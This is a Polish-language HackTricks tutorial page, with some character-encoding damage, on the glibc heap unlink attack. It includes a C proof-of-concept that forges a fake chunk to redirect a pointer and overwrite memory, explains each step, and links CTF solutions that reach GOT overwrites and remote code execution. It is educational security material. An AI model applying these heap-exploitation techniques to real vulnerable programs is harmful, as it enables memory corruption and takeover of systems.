# Atak Unlink

{% hint style="success" %}
Dowiedz si i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz si i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpniaj sztuczki hakerskie, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Podstawowe informacje

Kiedy ten atak zosta odkryty, g贸wnie pozwala na WWW (Write What Where), jednak dodano **sprawdzenia**, co sprawia, 偶e nowa wersja ataku jest bardziej interesujca, ale bardziej zo偶ona i **bezu偶yteczna**.

### Przykad kodu:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Atak nie dziaa, jeli s u偶ywane tcaches (po wersji 2.26)

### Cel

Ten atak pozwala **zmieni wska藕nik na blok tak, aby wskazywa 3 adresy przed samym sob**. Jeli nowa lokalizacja (otoczenie, gdzie znajdowa si wska藕nik) zawiera interesujce informacje, takie jak inne kontrolowalne alokacje / stos..., mo偶liwe jest odczytanie/nadpisanie ich w celu spowodowania wikszej szkody.

* Jeli ten wska藕nik znajdowa si na stosie, poniewa偶 teraz wskazuje 3 adresy przed samym sob, a u偶ytkownik potencjalnie mo偶e go odczyta i zmodyfikowa, bdzie mo偶liwe wyciekanie poufnych informacji ze stosu lub nawet modyfikacja adresu powrotu (mo偶e) bez dotykania canary
* W przykadach CTF ten wska藕nik znajduje si w tablicy wska藕nik贸w do innych alokacji, dlatego, ustawiajc go 3 adresy przed i majc mo偶liwo odczytu i zapisu, mo偶na sprawi, 偶e inne wska藕niki wskazuj na inne adresy.\
Poniewa偶 potencjalnie u偶ytkownik mo偶e r贸wnie偶 czyta/zapisywa inne alokacje, mo偶e wycieka informacje lub nadpisywa nowe adresy w dowolnych lokalizacjach (np. w GOT).

### Wymagania

* Pewna kontrola pamici (np. stos) w celu utworzenia kilku blok贸w, przypisujc wartoci do niekt贸rych atrybut贸w.
* Wyciek stosu w celu ustawienia wska藕nik贸w faszywego bloku.

### Atak

* Istniej dwa bloki (blok1 i blok2)
* Atakujcy kontroluje zawarto bloku1 oraz nag贸wki bloku2.
* W bloku1 atakujcy tworzy struktur faszywego bloku:
* Aby omin zabezpieczenia, upewnia si, 偶e pole `size` jest poprawne, aby unikn bdu: `corrupted size vs. prev_size while consolidating`
* a pola `fd` i `bk` faszywego bloku wskazuj tam, gdzie wska藕nik bloku1 jest przechowywany z przesuniciami odpowiednio -3 i -2, wic `fake_chunk->fd->bk` i `fake_chunk->bk->fd` wskazuj na pozycj w pamici (stosie), gdzie znajduje si rzeczywisty adres bloku1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Nag贸wki bloku2 s modyfikowane w taki spos贸b, aby wskazyway, 偶e poprzedni blok nie jest u偶ywany, a rozmiar to rozmiar zawartego faszywego bloku.
* Gdy drugi blok zostanie zwolniony, to nastpuje odczenie tego faszywego bloku:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Wczeniej sprawiono, 偶e `fake_chunk->fd->bk` i `fake_chunk->bk->fd` wskazuj na to samo miejsce (lokalizacj na stosie, gdzie przechowywany jest `blok1`, wic by to poprawny lista poczona). Poniewa偶 **oba wskazuj na t sam lokalizacj**, tylko ostatni (`fake_chunk->bk->fd = fake_chunk->fd`) bdzie **dziaa**.
* Spowoduje to **nadpisanie wska藕nika do bloku1 na stosie adresem (lub bajtami) przechowywanym 3 adresy wczeniej na stosie**.
* Dlatego jeli atakujcy m贸gby ponownie kontrolowa zawarto bloku1, bdzie m贸g **pisa wewntrz stosu**, majc potencjalnie mo偶liwo nadpisania adresu powrotu, pomijajc canary, oraz modyfikacji wartoci i wska藕nik贸w zmiennych lokalnych. Nawet ponownie modyfikujc adres bloku1 przechowywany na stosie na inn lokalizacj, jeli atakujcy m贸gby ponownie kontrolowa zawarto bloku1, bdzie m贸g pisa w dowolnym miejscu.
* Nale偶y zauwa偶y, 偶e byo to mo偶liwe, poniewa偶 **adresy s przechowywane na stosie**. Ryzyko i eksploatacja mog zale偶e od **miejsca, gdzie s przechowywane adresy do faszywego bloku**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Referencje

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Chocia偶 byoby dziwne znalezienie ataku unlink nawet w CTF, tutaj znajdziesz kilka rozwiza, gdzie ten atak by u偶ywany:
* Przykad CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* W tym przykadzie zamiast stosu jest tablica adres贸w zaalokowanych za pomoc malloc. Atak unlink jest wykonywany, aby m贸c zaalokowa tutaj blok, umo偶liwiajc kontrolowanie wska藕nik贸w tablicy zaalokowanych adres贸w. Nastpnie istnieje inna funkcjonalno, kt贸ra pozwala modyfikowa zawarto blok贸w w tych adresach, co pozwala wskazywa adresy na GOT, modyfikowa adresy funkcji w celu uzyskania wyciek贸w i RCE.
* Kolejny przykad CTF: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Podobnie jak w poprzednim przykadzie, istnieje tablica adres贸w alokacji. Mo偶liwe jest wykonanie ataku unlink, aby sprawi, 偶e adres pierwszej alokacji wskazuje kilka pozycji przed rozpoczciem tablicy, a nastpnie nadpisa t alokacj na nowej pozycji. Dziki temu mo偶liwe jest nadpisanie wska藕nik贸w innych alokacji, aby wskazyway na GOT atoi, uzyska wyciek libc, a nastpnie nadpisa atoi GOT adresem do jednego gad偶etu.
* Przykad CTF z niestandardowymi funkcjami malloc i free, kt贸re wykorzystuj podatno bardzo podobn do ataku unlink: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Istnieje przepenienie, kt贸re pozwala kontrolowa wska藕niki FD i BK niestandardowego malloc, kt贸re zostan (niestandardowo) zwolnione. Ponadto sterta ma ustawiony bit exec, wic mo偶liwe jest wyciekanie adresu sterty i wskazywanie funkcji z GOT na kawaek sterty z shellcodem do wykonania.

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
